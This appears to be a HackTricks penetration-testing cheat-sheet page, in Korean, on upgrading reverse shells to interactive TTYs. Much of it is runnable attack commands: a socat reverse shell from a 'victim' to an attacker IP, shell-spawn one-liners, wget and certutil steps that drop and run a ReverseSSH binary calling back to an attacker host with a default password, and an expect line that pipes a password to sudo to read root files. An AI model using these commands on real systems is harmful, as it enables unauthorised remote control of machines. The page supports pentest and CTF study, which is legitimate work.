# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

설정한 `SHELL` 변수의 shell은 **반드시** _**/etc/shells**_ **내부에 나열되어 있어야** 합니다. 그렇지 않으면 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`가 표시됩니다. 또한 다음 스니펫은 bash에서만 작동합니다. zsh를 사용 중이라면 shell을 얻기 전에 `bash`를 실행하여 bash로 변경하세요.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> **`stty -a`**를 실행하면 **행**과 **열**의 **수**를 확인할 수 있습니다.

#### 스크립트
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**interactive shell access**와 **file transfers**, **port forwarding**를 편리하게 사용하려면 정적으로 링크된 ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 target에 업로드하면 됩니다.<sup>[[1]](#references)</sup>

아래는 upx-compressed binaries를 사용하는 `x86`의 예시입니다. 다른 binaries의 경우 [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.

1. ssh port forwarding request를 수신하도록 로컬에서 준비합니다:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 대상 (이전 버전은 [project readme](https://github.com/Fahrj/reverse-ssh#features) 확인):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- ReverseSSH port forwarding 요청이 성공했다면, 이제 `reverse-ssh(.exe)`를 실행 중인 사용자의 권한으로 기본 비밀번호 `letmeinbrudipls`를 사용해 로그인할 수 있습니다:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope)는 Linux reverse shell을 자동으로 TTY로 업그레이드하고, 터미널 크기를 처리하며, 모든 내용을 로그로 기록하는 등 다양한 기능을 제공합니다. 또한 Windows shell에 readline 지원을 제공합니다.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

어떤 이유로든 full TTY를 얻을 수 없더라도 **여전히 사용자 입력을 요구하는 프로그램과 상호작용할 수 있습니다**. 다음 예시에서는 파일을 읽기 위해 password가 `sudo`에 전달됩니다:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTF 등을 위한 reverse shell 기능이 포함된 정적으로 링크된 ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 작업을 더 쉽게 수행할 수 있도록 몇 가지 기능을 자동화하는 shell handler](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
